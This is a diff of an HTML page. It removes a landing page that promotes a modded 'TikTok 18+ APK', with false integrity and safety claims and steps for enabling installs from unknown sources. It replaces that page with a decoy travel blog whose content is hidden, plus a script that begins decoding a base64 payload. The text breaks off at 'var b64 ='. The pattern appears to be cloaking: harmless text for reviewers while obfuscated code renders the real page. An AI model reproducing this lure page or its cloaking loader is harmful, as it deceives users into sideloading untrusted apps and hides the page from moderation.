@@ -1,16 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok 18+ APK v1.7.3 – adult version (2026)</title>
-    <link rel="icon" type="image/svg+xml" href="images/icon.png">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- styles.css will be linked – here we add style block for new elements (you can move this to styles.css) -->
-     <link rel="stylesheet" href="css/styles.css">
-	 <!-- Meta Pixel Code -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/svg+xml" href="images/icon.png">
+  <title>Roaming Horizons Travel Blog</title>
+  <meta name="description" content="Travel blog sharing stories, tips and guides from around the world">
+  <!-- Meta Pixel Code -->
 <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -27,705 +23,70 @@
 <img height="1" src="https://www.facebook.com/tr?id=898028166125961&amp;ev=PageView&amp;noscript=1" style="display:none" width="1"/>
 </noscript>
 <!-- End Meta Pixel Code -->
-    <style>
-        /* ---------- global dark (minimal, rest in your styles.css) ---------- */
-        body {
-            background-color: #0a0c0f;
-            color: #e0e0e0;
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-        }
-        .hero-gradient {
-            background: linear-gradient(145deg, #0f1217 0%, #1b232c 100%);
-            color: white;
-        }
-        .btn-download {
-            background-color: #c0123b;
-            color: white;
-            border-radius: 60px;
-            padding: 14px 38px;
-            font-weight: 600;
-            border: none;
-            transition: 0.2s;
-            box-shadow: 0 8px 16px rgba(180, 0, 50, 0.3);
-            cursor: pointer;
-            display: inline-block;
-            text-decoration: none;
-        }
-        .btn-download:hover {
-            background-color: #a00f32;
-            transform: scale(1.02);
-            color: white;
-        }
-        .feature-icon {
-            width: 64px;
-            height: 64px;
-            background: #c0123b;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            margin-bottom: 20px;
-        }
-        .pros-icon { color: #2db86b; margin-right: 12px; }
-        .cons-icon { color: #e05a6f; margin-right: 12px; }
-        .align-items-center {
-            display: flex;
-            flex-direction: column-reverse;
-        }
-        /* ----- screenshot carousel ----- */
-        .screenshot-carousel {
-            background: #121a22;
-            border-radius: 36px;
-            padding: 2rem 1rem;
-            border: 1px solid #2c3b4a;
-            margin-top: 1.5rem;
-        }
-        .carousel-image-wrapper {
-            max-width: 300px;
-            margin: 0 auto;
-            border-radius: 36px;
-            overflow: hidden;
-            box-shadow: 0 20px 30px -10px black;
-        }
-        .carousel-image-wrapper img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        .carousel-control-prev, .carousel-control-next {
-            filter: invert(1);
-            opacity: 0.7;
-        }
-        .carousel-indicators {
-            margin-bottom: -1.5rem;
-        }
-        .carousel-indicators [data-bs-target] {
-            background-color: #c0123b;
-        }
-
-        /* ---------- beautiful download overlay ---------- */
-        .download-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(8, 12, 18, 0.95);
-            backdrop-filter: blur(12px);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.4s ease;
-            color: white;
-        }
-        .download-overlay.show {
-            opacity: 1;
-            visibility: visible;
-        }
-        .download-card {
-            background: #151f2b;
-            border-radius: 48px;
-            padding: 2.5rem;
-            max-width: 500px;
-            text-align: center;
-            border: 1px solid #c0123b55;
-            box-shadow: 0 30px 50px #00000080, 0 0 0 2px #c0123b inset;
-            transform: scale(0.95);
-            transition: 0.3s;
-        }
-        .download-overlay.show .download-card {
-            transform: scale(1);
-        }
-        .counter {
-            font-size: 4rem;
-            font-weight: 800;
-            background: linear-gradient(45deg, #ff8a9f, #dc143c);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            line-height: 1.2;
-        }
-        .counter-label {
-            font-size: 1.2rem;
-            color: #acb8cc;
-        }
-        .progress-bar-custom {
-            height: 8px;
-            background: #2a3848;
-            border-radius: 20px;
-            margin: 1.8rem 0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #dc143c, #ff6a8a);
-            border-radius: 20px;
-            transition: width 3s cubic-bezier(0.1, 0.8, 0.3, 1);
-        }
-
-        /* instruction card (dark, english) */
-        .instruction-card {
-            max-width: 1000px;
-            margin: 2rem auto 0;
-            background: #16202d;
-            border-radius: 48px;
-            box-shadow: 0 30px 60px -20px #000000d0, 0 0 0 1px #2e4055 inset;
-            padding: 2rem 2rem 2.5rem;
-            border: 1px solid #253441;
-        }
-        .instruction-header .android-badge {
-            background: #2b4f3b;
-            color: #c0f2d0;
-            padding: 0.4rem 1rem;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.9rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 6px 14px #1f4b2f80;
-        }
-        .instruction-title {
-            font-size: 2.2rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ffffff, #dcb0c0);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .steps-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 1.25rem;
-            margin: 2.5rem 0 2rem;
-        }
-        .step-item {
-            background: #1f2b39;
-            border-radius: 28px;
-            padding: 1.2rem 1.8rem 1.2rem 1.2rem;
-            display: flex;
-            align-items: center;
-            gap: 0.2rem;
-            box-shadow: 0 8px 18px -6px #00000080;
-            border: 1px solid #314c66;
-        }
-        .step-number {
-            width: 48px;
-            height: 48px;
-            background: #29394f;
-            border-radius: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: #ff9bb0;
-            flex-shrink: 0;
-        }
-        .step-content { flex: 1; }
-        .step-title {
-            font-weight: 700;
-            font-size: 1.25rem;
-            color: #ffffff;
-        }
-        .step-desc { color: #b2c9e5; font-size: 0.98rem; }
-        .step-icon { font-size: 1.6rem; color: #ff889f; width: 40px; text-align: center; }
-        .warning-note {
-            background: #2f281c;
-            border-left: 6px solid #f6b83e;
-            border-radius: 24px;
-            padding: 1.2rem 1.8rem;
-            margin: 2rem 0 1.8rem;
-            display: flex;
-            gap: 1rem;
-        }
-        .warning-note i { font-size: 1.8rem; color: #f6b83e; }
-        .toggle-demo-left {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        .toggle-demo {
-            background: #10161f;
-            border-radius: 36px;
-            padding: 1.5rem 2rem;
-            margin-top: 2rem;
-            display: flex;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1.5rem;
-            border: 1px solid #4f5b7e;
-            justify-content: center;
-        }
-        .toggle-switch {
-            width: 60px; height: 30px; background: #38405f; border-radius: 40px;
-            display: flex; align-items: center; padding: 3px;
-        }
-        .toggle-switch-circle {
-            width: 24px; height: 24px; background: #a5b4e0; border-radius: 50%;
-            transition: 0.2s;
-        }
-        .toggle-active .toggle-switch-circle { transform: translateX(30px); background: #6cdb8c; }
-        .demo-small {
-            background: #1f293d; padding: 0.3rem 1rem; border-radius: 40px; color: #b0c2ff;
-        }
-        .footnote {
-            font-size: 0.9rem; color: #95a9cc; margin-top: 2rem; text-align: center;
-            border-top: 2px dashed #2d4057; padding-top: 1.5rem;
-        }
-        @media (max-width: 550px) {
-            .instruction-card { padding: 1.5rem; }
-            .instruction-title { font-size: 1.8rem; }
-        }
-    </style>
+  <style>
+    body { font-family: Georgia, serif; background: #fafafa; color: #444; }
+    .container { max-width: 860px; margin: 0 auto; padding: 20px; }
+    h1 { font-size: 28px; color: #2c7a7b; }
+    h2 { font-size: 20px; color: #555; }
+    p { line-height: 1.7; }
+    .tag { display: inline-block; background: #e0f2f1; padding: 2px 8px; border-radius: 4px; font-size: 13px; margin: 2px; }
+	body { 
+    visibility: hidden; 
+    opacity: 0;
+    transition: opacity 0.4s ease; 
+}
+  </style>
 </head>
 <body>
 
-    <!-- DOWNLOAD OVERLAY (beautiful counter) -->
-    <div id="downloadOverlay" class="download-overlay">
-        <div class="download-card">
-            <i class="bi bi-arrow-repeat" style="font-size: 3rem; color: #dc143c;"></i>
-            <h3 class="mt-3 text-light">Preparing your download</h3>
-            <div class="counter" id="counter">0%</div>
-            <div class="progress-bar-custom">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            <p class="counter-label" id="counterText">initializing secure link ...</p>
-            <div class="mt-3 text-secondary small">
-                <i class="bi bi-shield-check text-danger"></i> encrypted · 18+ only
-            </div>
-        </div>
-    </div>
-
-    <nav class="navbar navbar-expand-lg navbar-dark py-2" style="background: #0a0e12;">
-        <div class="container">
-            <a class="navbar-brand fw-bold text-light" href="#"><i class="bi bi-tiktok me-2 text-danger"></i>Pro<span class="text-danger">TikTok</span>18+</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDark">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNavDark">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item"><a class="nav-link" href="#">Home</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#features">Features</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#screens">Screens</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#video">Video</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#faq">FAQ</a></li>
-                </ul>
-            </div>
-        </div>
-    </nav>
-
-    <div class="hero-gradient py-5 border-bottom border-secondary border-opacity-10">
-        <div class="container py-3">
-            <div class="row align-items-center g-4">
-                <div class="col-lg-7" style="padding: 0 30px;">
-                    <span class="badge bg-danger px-3 py-2 mb-3 fs-6">🔥 v1.7.3 – 2026 EDITION</span>
-                    <h1 class="display-4 fw-bold mb-3">TikTok 18+ <span style="color:#dc143c;">APK</span></h1>
-                    <p class="lead fs-3" style="color:#cfdeff;">Adult-oriented version with exclusive content, no ads, 4K player, and background audio.</p>
-                    <div class="d-flex flex-wrap gap-3 mt-4">
-                        
-                        <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically&hl=en_GB" class="btn btn-download btn-lg" id="downloadBtn" download><i class="bi bi-cloud-arrow-down-fill me-2"></i>Download APK v1.7.3</a>
-                        <a href="#screens" class="screens btn btn-outline-light btn-lg rounded-pill px-4"><i class="bi bi-images me-2"></i>View screens</a>
-                    </div>
-                    <div class="mt-4 small text-secondary">
-                        <i class="bi bi-shield-check text-warning me-1"></i> verified 18+ · size 8.3 MB · updated 2026-03-10
-                    </div>
-                </div>
-                <div class="col-lg-5 text-center">
-                    <img src="images/icon.png" alt="TikTok 18+ hero" class="img-fluid rounded-4" style="max-height: 300px;">
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="container my-5">
-
-        <div class="row justify-content-center mb-5">
-            <div class="col-lg-8">
-                <div class="card border-0 shadow-lg" style="background: #131b23 !important;">
-                    <div class="card-body p-4">
-                        <h5 class="card-title text-center text-light mb-4"><i class="bi bi-info-circle me-2 text-danger"></i>App details</h5>
-                        <div class="row text-center g-2">
-                            <div class="col-sm-3 col-6"><strong>Name</strong><br>TikTok 18+</div>
-                            <div class="col-sm-3 col-6"><strong>Version</strong><br>v1.7.3</div>
-                            <div class="col-sm-3 col-6"><strong>Size</strong><br>8.31 MB</div>
-                            <div class="col-sm-3 col-6"><strong>Updated</strong><br>03/2026</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <section id="features" class="mb-5">
-            <h2 class="text-center mb-5 fw-bold"><span class="border-bottom border-danger pb-2">Core features</span></h2>
-            <div class="row g-4">
-                <div class="col-md-4">
-                    <div class="card h-100 text-center p-4 border-0" style="background: #121a22;">
-                        <div class="feature-icon mx-auto"><i class="bi bi-unlock"></i></div>
-                        <h5 class="text-light">18+ unrestricted</h5>
-                        <p class="text-secondary">Watch & upload adult content, no region blocks. Full access to mature feeds.</p>
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="card h-100 text-center p-4 border-0" style="background: #121a22;">
-                        <div class="feature-icon mx-auto"><i class="bi bi-film"></i></div>
-                        <h5 class="text-light">4K / HD player</h5>
-                        <p class="text-secondary">Stream up to 4K resolution, adaptive bitrate, hardware accelerated.</p>
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="card h-100 text-center p-4 border-0" style="background: #121a22;">
-                        <div class="feature-icon mx-auto"><i class="bi bi-magic"></i></div>
-                        <h5 class="text-light">Pro video editor</h5>
-                        <p class="text-secondary">Advanced filters, stickers, slow-mo, green screen – exclusive to this mod.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <div class="row mb-5 g-4">
-            <div class="col-md-6">
-                <div class="card border-0 bg-success bg-opacity-10 h-100" style="background: #10221b !important;">
-                    <div class="card-header bg-success text-white border-0 fw-bold"><i class="bi bi-check-circle-fill me-2"></i>Advantages</div>
-                    <div class="card-body">
-                        <ul class="list-unstyled">
-                            <li><i class="bi bi-check-circle-fill pros-icon"></i> Unlock 18+ & exclusive content</li>
-                            <li><i class="bi bi-check-circle-fill pros-icon"></i> Completely ad‑free experience</li>
-                            <li><i class="bi bi-check-circle-fill pros-icon"></i> Save videos directly to device</li>
-                            <li><i class="bi bi-check-circle-fill pros-icon"></i> Background audio play</li>
-                            <li><i class="bi bi-check-circle-fill pros-icon"></i> No login required to browse</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-6">
-                <div class="card border-0 bg-danger bg-opacity-10 h-100" style="background: #26161b !important;">
-                    <div class="card-header bg-danger text-white border-0 fw-bold"><i class="bi bi-exclamation-triangle-fill me-2"></i>Disadvantages</div>
-                    <div class="card-body">
-                        <ul class="list-unstyled">
-                            <li><i class="bi bi-x-circle-fill cons-icon"></i> Not on official stores (APK only)</li>
-                            <li><i class="bi bi-x-circle-fill cons-icon"></i> Manual updates required</li>
-                            <li><i class="bi bi-x-circle-fill cons-icon"></i> Security: sideload only from trusted sources</li>
-                            <li><i class="bi bi-x-circle-fill cons-icon"></i> May violate TikTok ToS</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- SCREENSHOTS CAROUSEL -->
-        <section id="screens" class="mb-5">
-            <h2 class="section-title text-center mb-4"><i class="bi bi-images me-2 text-danger"></i>Screenshots</h2>
-            <div class="screenshot-carousel">
-                <div id="screenshotCarousel" class="carousel slide" data-bs-ride="carousel">
-                    <div class="carousel-indicators">
-                        <button type="button" data-bs-target="#screenshotCarousel" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
-                        <button type="button" data-bs-target="#screenshotCarousel" data-bs-slide-to="1" aria-label="Slide 2"></button>
-                        <button type="button" data-bs-target="#screenshotCarousel" data-bs-slide-to="2" aria-label="Slide 3"></button>
-                        <button type="button" data-bs-target="#screenshotCarousel" data-bs-slide-to="3" aria-label="Slide 4"></button>
-                        <button type="button" data-bs-target="#screenshotCarousel" data-bs-slide-to="4" aria-label="Slide 5"></button>
-                    </div>
-                    <div class="carousel-inner">
-                        <div class="carousel-item active">
-                            <div class="carousel-image-wrapper">
-                                <img src="images/1.png" class="d-block w-100" alt="Screenshot 1">
-                            </div>
-                        </div>
-                        <div class="carousel-item">
-                            <div class="carousel-image-wrapper">
-                                <img src="images/2.png" class="d-block w-100" alt="Screenshot 2">
-                            </div>
-                        </div>
-                        <div class="carousel-item">
-                            <div class="carousel-image-wrapper">
-                                <img src="images/3.png" class="d-block w-100" alt="Screenshot 3">
-                            </div>
-                        </div>
-                        <div class="carousel-item">
-                            <div class="carousel-image-wrapper">
-                                <img src="images/4.png" class="d-block w-100" alt="Screenshot 4">
-                            </div>
-                        </div>
-                        <div class="carousel-item">
-                            <div class="carousel-image-wrapper">
-                                <img src="images/5.png" class="d-block w-100" alt="Screenshot 5">
-                            </div>
-                        </div>
-                    </div>
-                    <button class="carousel-control-prev" type="button" data-bs-target="#screenshotCarousel" data-bs-slide="prev">
-                        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-                        <span class="visually-hidden">Previous</span>
-                    </button>
-                    <button class="carousel-control-next" type="button" data-bs-target="#screenshotCarousel" data-bs-slide="next">
-                        <span class="carousel-control-next-icon" aria-hidden="true"></span>
-                        <span class="visually-hidden">Next</span>
-                    </button>
-                </div>
-            </div>
-        </section>
-
-        <section id="video" class="mb-5">
-            <h2 class="section-title"><i class="bi bi-play-circle"></i>Live Previews</h2>
-            <div class="video-grid">
-                <div class="mockup-card">
-                    <div class="phone-mockup">
-                        <div class="mockup-screen">
-                            <video loop muted playsinline controls>
-                                <source src="media/1.mp4" type="video/mp4">
-                            </video>
-                            
-                            <div class="mockup-overlay">
-                                <div class="mockup-user">
-                                    <a href="#" class="mockup-username">@mia.dreams</a>
-                                    <p class="mockup-description">Description goes here</p>
-                                    <div class="mockup-hashtags">#hashtags #music #dance</div>
-                                    <span class="mockup-translation">See translation</span>
-                                </div>
-
-                                <div class="mockup-actions">
-                                    <button class="mockup-action-btn like-btn" data-id="1">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-heart"></i></span>
-                                        <span class="mockup-action-count like-count" id="likeCount1">15K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-comment"></i></span>
-                                        <span class="mockup-action-count">2.5K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-paper-plane"></i></span>
-                                        <span class="mockup-action-count"></span>
-                                    </button>
-                                </div>
-
-                                <div class="mockup-sound">
-                                    <div class="mockup-sound-info">
-                                        <span class="sound-icon">🔊</span>
-                                        <span class="sound-text">J3 Original sound</span>
-                                    </div>
-                                    <button class="mockup-mute-btn mute-btn" data-video="0">Mute</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="mockup-card">
-                    <div class="phone-mockup">
-                        <div class="mockup-screen">
-                            <video loop muted playsinline controls>
-                                <source src="media/2.mp4" type="video/mp4">
-                            </video>
-                            
-                            <div class="mockup-overlay">
-                                <div class="mockup-user">
-                                    <a href="#" class="mockup-username">@james_21</a>
-                                    <p class="mockup-description">Evening vibes 🔥</p>
-                                    <div class="mockup-hashtags">#night #music #relax</div>
-                                    <span class="mockup-translation">See translation</span>
-                                </div>
-
-                                <div class="mockup-actions">
-                                    <button class="mockup-action-btn like-btn" data-id="2">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-heart"></i></span>
-                                        <span class="mockup-action-count like-count" id="likeCount2">8.2K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-comment"></i></span>
-                                        <span class="mockup-action-count">1.1K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-paper-plane"></i></span>
-                                        <span class="mockup-action-count"></span>
-                                    </button>
-                                </div>
-
-                                <div class="mockup-sound">
-                                    <div class="mockup-sound-info">
-                                        <span class="sound-icon">🔊</span>
-                                        <span class="sound-text">Night vibes - remix</span>
-                                    </div>
-                                    <button class="mockup-mute-btn mute-btn" data-video="1">Mute</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="mockup-card">
-                    <div class="phone-mockup">
-                        <div class="mockup-screen">
-                            <video loop muted playsinline controls>
-                                <source src="media/3.mp4" type="video/mp4">
-                            </video>
-                            
-                            <div class="mockup-overlay">
-                                <div class="mockup-user">
-                                    <a href="#" class="mockup-username">@luna.official</a>
-                                    <p class="mockup-description">New dance challenge</p>
-                                    <div class="mockup-hashtags">#dance #challenge #trending</div>
-                                    <span class="mockup-translation">See translation</span>
-                                </div>
-
-                                <div class="mockup-actions">
-                                    <button class="mockup-action-btn like-btn" data-id="3">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-heart"></i></span>
-                                        <span class="mockup-action-count like-count" id="likeCount3">24K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-comment"></i></span>
-                                        <span class="mockup-action-count">3.8K</span>
-                                    </button>
-                                    
-                                    <button class="mockup-action-btn">
-                                        <span class="mockup-action-icon"><i class="fa-regular fa-paper-plane"></i></span>
-                                        <span class="mockup-action-count"></span>
-                                    </button>
-                                </div>
-
-                                <div class="mockup-sound">
-                                    <div class="mockup-sound-info">
-                                        <span class="sound-icon">🔊</span>
-                                        <span class="sound-text">Dance challenge 2026</span>
-                                    </div>
-                                    <button class="mockup-mute-btn mute-btn" data-video="2">Mute</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- EXTRA DOWNLOAD BUTTON under Live Previews (с реальной ссылкой) -->
-            <div class="text-center mt-5">
-                <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically&hl=en_GB" class="btn btn-download btn-lg" id="downloadBtn2" download><i class="bi bi-cloud-arrow-down-fill me-2"></i>Download APK v1.7.3</a>
-            </div>
-        </section>
-
-        <h2 class="text-center mb-4 fw-bold">vs official TikTok</h2>
-        <div class="table-responsive mb-5">
-            <table class="table table-bordered table-hover align-middle comparison-table">
-                <thead><tr><th>Feature</th><th>Official TikTok</th><th>TikTok 18+ v1.7.3</th></tr></thead>
-                <tbody>
-                    <tr><td>18+ content</td><td>❌ forbidden</td><td class="text-success fw-bold">✅ allowed</td></tr>
-                    <tr><td>Ads</td><td>✅ yes (frequent)</td><td class="text-success fw-bold">❌ none</td></tr>
-                    <tr><td>Download videos</td><td>⚠️ watermarked / limited</td><td class="text-success fw-bold">✅ full HD no watermark</td></tr>
-                    <tr><td>Background play</td><td>❌ no</td><td class="text-success fw-bold">✅ yes (audio)</td></tr>
-                    <tr><td>Registration</td><td>✅ required</td><td class="text-success fw-bold">❌ optional</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <section id="faq" class="faq-section">
-            <h2 class="text-center mb-4 text-light">Frequently asked questions</h2>
-            <div class="accordion" id="faqAccordionDark">
-                <div class="accordion-item">
-                    <h2 class="accordion-header"><button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#faq1Dark">Is TikTok 18+ safe?</button></h2>
-                    <div id="faq1Dark" class="accordion-collapse collapse show" data-bs-parent="#faqAccordionDark">
-                        <div class="accordion-body">If downloaded from a trusted source like this site, yes. We verify APK integrity. However content is strictly for adults 18+.</div>
-                    </div>
-                </div>
-                <div class="accordion-item">
-                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq2Dark">Why not on Google Play?</button></h2>
-                    <div id="faq2Dark" class="accordion-collapse collapse" data-bs-parent="#faqAccordionDark">
-                        <div class="accordion-body">Google Play restricts explicit 18+ apps, so it's distributed as APK outside Play Store.</div>
-                    </div>
-                </div>
-                <div class="accordion-item">
-                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq3Dark">How to update?</button></h2>
-                    <div id="faq3Dark" class="accordion-collapse collapse" data-bs-parent="#faqAccordionDark">
-                        <div class="accordion-body">Updates are manual. Download the latest APK and install over existing app (data is preserved).</div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- INSTRUCTION CARD (target for scroll after download overlay) -->
-        <div class="instruction-card mt-5" id="instructionCard">
-            <div class="instruction-header mb-3">
-                <span class="android-badge"><i class="fab fa-android"></i> Android 11+ · universal</span>
-            </div>
-            <h2 class="instruction-title">How to install APK</h2>
-            <div class="subhead" style="color: #a0b6d0; margin-bottom: 2rem;">
-                <i class="fas fa-check-circle" style="color: #dc143c;"></i> Simple steps for any Android device
-            </div>
-            <div class="steps-grid">
-                <div class="step-item">
-                    <div class="step-number">1</div>
-                    <i class="fas fa-download step-icon"></i>
-                    <div class="step-content">
-                        <div class="step-title">Download the APK file</div>
-                        <div class="step-desc">Use any browser (Chrome, Firefox). After download, tap the notification or open your Downloads folder.</div>
-                    </div>
-                </div>
-                <div class="step-item">
-                    <div class="step-number">2</div>
-                    <i class="fas fa-shield-alt step-icon"></i>
-                    <div class="step-content">
-                        <div class="step-title">Allow install from unknown sources</div>
-                        <div class="step-desc">When you tap the APK, Android may ask permission. Tap <strong>Settings</strong> → allow from this source (your browser or file manager).</div>
-                    </div>
-                </div>
-                <div class="step-item">
-                    <div class="step-number">3</div>
-                    <i class="fas fa-fingerprint step-icon"></i>
-                    <div class="step-content">
-                        <div class="step-title">Confirm if prompted</div>
-                        <div class="step-desc">Some devices ask for PIN / fingerprint for security. Verify to continue.</div>
-                    </div>
-                </div>
-                <div class="step-item">
-                    <div class="step-number">4</div>
-                    <i class="fas fa-rocket step-icon"></i>
-                    <div class="step-content">
-                        <div class="step-title">Press Install</div>
-                        <div class="step-desc">Review permissions and tap "Install". After completion choose Open or Done.</div>
-                    </div>
-                </div>
-            </div>
-            <div class="warning-note">
-                <i class="fas fa-lightbulb"></i>
-                <div>
-                    <p style="font-weight: 700;">🔐 Security tip (Android)</p>
-                    <p>If permission is not requested, manually go to <strong>Settings → Security → Install unknown apps</strong> and enable for your browser / file manager.</p>
-                </div>
-            </div>
-            <div class="toggle-demo">
-                <div class="toggle-demo-left">
-                    <div class="toggle-switch toggle-active"><div class="toggle-switch-circle"></div></div>
-                    <div class="toggle-demo-text"><i class="fas fa-check-circle" style="color:#6cdb8c;"></i>  Chrome allowed</div>
-                </div>
-                <div class="demo-small"><i class="fas fa-cog"></i> Settings → Apps → special access</div>
-            </div>
-            <div class="footnote">
-                <i class="fas fa-shield-halved"></i> Download APK only from trusted sources. Google Play Protect scans apps.
-            </div>
-        </div>
-
-    </div>
-
-    <footer class="bg-black text-white-50 py-5 mt-5 border-top border-secondary">
-        <div class="container text-center">
-            <p class="mb-1 fs-5">© 2026 TikTok 18+ APK v1.7.3 · independent fan site</p>
-            <p class="small">Not affiliated with TikTok Inc. or ByteDance. 18+ only.</p>
-            <div class="d-flex justify-content-center gap-4 mt-3">
-                <i class="bi bi-tiktok" style="font-size: 1.5rem;"></i>
-                <i class="bi bi-android2" style="font-size: 1.5rem;"></i>
-            </div>
-            <p><i class="bi bi-shield-lock-fill" style="color:#dc143c;"></i></p>
-        </div>
-    </footer>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  
+  <div style="display:none">
+  <div class="container">
+    <h1>Roaming Horizons Travel Blog</h1>
+    <p>Your guide to unforgettable journeys across continents. We share authentic travel experiences, expert tips, and unique destinations to inspire your next adventure.</p>
     
+    <h2>Latest Posts</h2>
+    <p>— Exploring Morocco’s Desert: A Night in the Sahara</p>
+    <p>— The Best Coastal Drives in Portugal You Shouldn’t Miss</p>
+    <p>— A Food Lover’s Guide to Istanbul</p>
+    
+    <h2>Popular Tags</h2>
+    <span class="tag">Adventure</span>
+    <span class="tag">Road Trips</span>
+    <span class="tag">Desert Travel</span>
+    <span class="tag">Food Journeys</span>
+    <span class="tag">Coastal Escapes</span>
+    
+    <h2>Contact</h2>
+    <p>Email: hello.roaminghorizons@gmail.com</p>
+    <p>Found us on Google Maps: <a href="https://maps.app.goo.gl/exampleXYZ">Roaming Horizons Hub, Barcelona, Spain</a></p>
+    <p>We typically respond within 1–3 business days. Feel free to reach out for tips, stories, or collaborations.</p>
+  </div>
+</div>
+
+  
+  <div id="app"></div>
+
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    
+    (function() {
+      var b64 =
